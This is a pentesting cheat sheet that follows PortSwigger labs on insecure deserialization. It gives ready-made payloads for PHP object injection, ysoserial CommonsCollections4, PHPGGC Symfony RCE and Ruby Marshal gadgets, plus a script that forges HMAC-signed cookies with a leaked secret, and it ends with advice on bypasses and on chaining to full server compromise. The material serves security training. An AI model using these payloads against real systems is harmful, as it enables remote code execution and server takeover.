# Insecure deserialization — Pre-built gadget chains

When simple attribute modification isn't enough (the class has no useful attributes, or the cookie is signed), use existing library gadget chains: inject a serialized object of a known gadget-chain class (PHP CustomTemplate `__destruct`, Java Apache Commons, Symfony/PHP, Ruby Marshal). Tools: ysoserial, PHPGGC, documented Ruby gadgets.

## Quick reference
```bash
# PHP: arbitrary object injection (inject class with dangerous __destruct)
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}

# Java: ysoserial (Apache Commons Collections)
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
# Java 16+:
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
     --add-opens=java.base/java.net=ALL-UNNAMED \
     --add-opens=java.base/java.util=ALL-UNNAMED \
     -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64

# PHP Symfony (HMAC-signed cookie): PHPGGC + sign script
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
# sign with PHP:
php -r '$o="PHPGGC_B64";$k="SECRET";echo urlencode(json_encode(["token"=>$o,"sig_hmac_sha1"=>hash_hmac("sha1",$o,$k)]));'

# Ruby: vakzz Universal Deserialisation Gadget (devcraft.io)
# Set command: rm /home/carlos/morale.txt
# Output: puts Base64.encode64(payload)
# Run → URL-encode output → use as session cookie
```

## Root cause
Third-party libraries (Apache Commons Collections, Symfony, Ruby stdlib) contain classes whose method chains, when triggered by deserialization magic methods, execute arbitrary code. The attacker doesn't need to find application-specific classes — the library classes already exist in the classpath.

## Find it
- **Java** session cookie: Base64-decode → first 2 bytes `\xAC\xED` (or Base64 prefix `rO0A`) = Java serialized.
- **PHP** HMAC-signed cookie: JSON wrapper with `token` and `sig_hmac_sha1` fields.
- **PHP** source backup at `/libs/ClassName.php~` — look for magic methods (`__destruct`, `__wakeup`).
- **Ruby** session cookie: Base64 starts with `BAh` (Marshal.dump format).
- Always check phpinfo.php for framework name/version → look up in PHPGGC list.

## Technique

**Arbitrary object injection in PHP (Lab 1):**
1. Cookie = PHP serialized object. Site map → `/libs/CustomTemplate.php~` → download source.
2. Source: `CustomTemplate.__destruct()` calls `unlink($this->lock_file_path)` → deletes a file.
3. Inject: `O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`.
4. Base64+URL-encode → set as session cookie → server deserializes → GC runs → `__destruct()` → file deleted.

**Java Apache Commons (Lab 2):**
1. Session cookie = Java serialized object (Base64 starts `rO0A`).
2. Run ysoserial with CommonsCollections4 gadget chain.
3. URL-encode the Base64 output → set as session cookie → server deserializes → RCE.

**PHP Symfony with signed cookie (Lab 3):**
1. Cookie = `{"token":"<base64>","sig_hmac_sha1":"<hmac>"}`. Modified token rejected (wrong signature).
2. GET `/cgi-bin/phpinfo.php` (found via dev comment in error messages) → framework = Symfony 4.3.6, `SECRET_KEY` env var.
3. PHPGGC: `./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64` → get payload.
4. Sign with PHP script using SECRET_KEY → get valid signed cookie → RCE.

**Ruby gadget chain (Lab 4):**
1. Session cookie = Base64 Ruby Marshal object.
2. Find vakzz's "Universal Deserialisation Gadget for Ruby 2.x-3.x" on devcraft.io.
3. Modify: command = `rm /home/carlos/morale.txt`, output = `puts Base64.encode64(payload)`.
4. Run Ruby script → copy Base64 output → URL-encode → set as session cookie → RCE.

## Payload arsenal
```bash
# PHP arbitrary object (lock_file_path)
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}

# Java ysoserial CommonsCollections4
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64

# PHPGGC Symfony RCE
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64

# PHP signing script
<?php
$object = "PHPGGC_BASE64_OUTPUT";
$secretKey = "SECRET_FROM_PHPINFO";
$cookie = urlencode('{"token":"'.$object.'","sig_hmac_sha1":"'.hash_hmac('sha1', $object, $secretKey).'"}');
echo $cookie;
```

## Finding gadget chains
- PHP: check `.php~` backup files in site map; grep for `__wakeup`, `__destruct`, `__get`, `call_user_func`.
- Java: check ysoserial's list of gadget chains; match against classpath (Maven POM, error messages, server headers).
- PHP framework: phpinfo → framework name+version → `./phpggc --list` to find available chains.
- Ruby: documented gadgets for stdlib; look up by Ruby version.

## Bypasses
| Defense | Bypass |
|---|---|
| HMAC signature on PHP cookie | Get SECRET_KEY from phpinfo.php → re-sign with PHPGGC payload |
| Java signing/MAC | ysoserial payload replaces the object wholesale; if MAC is not present, works directly |
| Specific library not available | Try multiple ysoserial chains (CommonsCollections1-7, Spring, etc.) |

## Labs

### Arbitrary object injection in PHP [Practitioner]
Source at `/libs/CustomTemplate.php~`. `__destruct()` calls `unlink($lock_file_path)`. Inject object with path = `/home/carlos/morale.txt` → file deleted. Key insight: any class in the codebase with a dangerous magic method is a gadget — no third-party library needed.

### Exploiting Java deserialization with Apache Commons [Practitioner]
Session cookie = Java serialized object. ysoserial CommonsCollections4 → `rm /home/carlos/morale.txt` → Base64+URL-encode → cookie → RCE on deserialization. Key insight: Apache Commons Collections gadget chain converts deserialization to arbitrary command execution.

### Exploiting PHP deserialization with a pre-built gadget chain [Practitioner]
Cookie signed with HMAC-SHA1. phpinfo.php reveals Symfony 4.3.6 + SECRET_KEY. PHPGGC generates Symfony/RCE4 payload. PHP script re-signs with SECRET_KEY → valid cookie → RCE. Key insight: phpinfo.php leaks the secret needed to forge signatures.

### Exploiting Ruby deserialization using a documented gadget chain [Practitioner]
Session cookie = Ruby Marshal. vakzz's documented gadget for Ruby 2.x-3.x. Modify command → run script → Base64 payload → URL-encode → cookie → RCE. Key insight: Ruby Marshal has a well-known public gadget chain; no source needed.

## Chaining
- Deserialization gadget → **RCE** → full server compromise → pivot to internal services / cloud IMDS ([SSRF](../../SSRF/), [objectives: Cloud/internal](../../references/objectives-attack-trees.md)).
- RCE → read app source/secrets → lateral movement ([Information-disclosure](../../Information-disclosure/), [Path-traversal](../../Path-traversal/)).
- See [chaining-playbook → Deserialization→RCE](../../references/chaining-playbook.md).

## Real-world notes
- ysoserial CommonsCollections is a classic; Apache Commons Collections appears in countless Java apps.
- Always get phpinfo.php early — framework version + SECRET_KEY saves hours.
- PHPGGC has 50+ gadget chains; try `./phpggc --list` to find what fits the target framework.
- Ruby's Marshal is dangerous by design — any deserialization of untrusted data is RCE.

## References
- https://portswigger.net/web-security/deserialization/exploiting
- https://github.com/frohoff/ysoserial
- https://github.com/ambionics/phpggc
